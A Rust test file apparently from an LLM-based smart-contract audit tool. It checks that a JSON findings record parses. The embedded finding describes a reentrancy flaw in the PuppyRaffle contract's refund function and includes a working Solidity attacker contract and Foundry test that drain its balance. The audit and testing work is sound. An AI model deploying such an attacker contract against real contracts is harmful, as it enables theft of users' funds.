/// Test with the ACTUAL failing JSON from the latest error
use ai_agent_audit::llm_review::findings::findings::{Findings, FromLLMJson};

#[test]
fn test_actual_failing_json() {
    let json = r#"{"findings": [{"derived_from": "Reentrancy","title": "Reentrancy in refund function allows draining the contract","description": "The `refund` function violates the Checks-Effects-Interactions pattern. It sends ETH to `msg.sender` via `sendValue` *before* setting the player's array slot to `address(0)`. A malicious actor can re-enter the `refund` function from their `receive()` or `fallback()` method. Since the state `players[playerIndex]` has not yet been updated to `address(0)`, the `require` check passes again, allowing the attacker to claim the refund multiple times and drain the contract's balance.","exploit_type": "Reentrancy","privilege": "Permissionless","contract": "PuppyRaffle","function": "refund","impact": "The entire contract balance (entrance fees of all players) can be stolen.","proof_of_concept": "1. Attacker deploys a malicious contract. 2. Contract enters raffle. 3. Contract calls `refund`. 4. In `receive()`, contract calls `refund` again. 5. This repeats until balance is drained.","proof_of_code": "contract ReentrancyAttacker { PuppyRaffle raffle; uint256 idx; constructor(PuppyRaffle _r) { raffle = _r; } function attack() external payable { address[] memory p = new address[](1); p[0] = address(this); raffle.enterRaffle{value: 1 ether}(p); idx = raffle.getActivePlayerIndex(address(this)); raffle.refund(idx); } receive() external payable { if (address(raffle).balance >= 1 ether) { raffle.refund(idx); } } } function testReentrancy() public { ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle); vm.deal(address(attacker), 1 ether); attacker.attack(); assertEq(address(puppyRaffle).balance, 0); }","severity": "High","mitigation": "Update the state before making the external call (Checks-Effects-Interactions pattern) or use a ReentrancyGuard modifier."}]}"#;

    println!("Testing actual failing JSON...");
    println!("JSON length: {} bytes", json.len());
    
    let result = Findings::parse_from_json(json);
    
    match result {
        Ok(findings) => {
            println!("✅ SUCCESS: Parsed {} findings", findings.findings.len());
            assert_eq!(findings.findings.len(), 1);
        }
        Err(e) => {
            println!("❌ FAILED: {}", e);
            
            // Try to clean it manually and see what happens
            let cleaned = Findings::clean_json_string(json);
            println!("\n=== CLEANED JSON ===");
            println!("{}", cleaned);
            println!("=== END CLEANED ===\n");
            
            panic!("Failed to parse: {}", e);
        }
    }
}

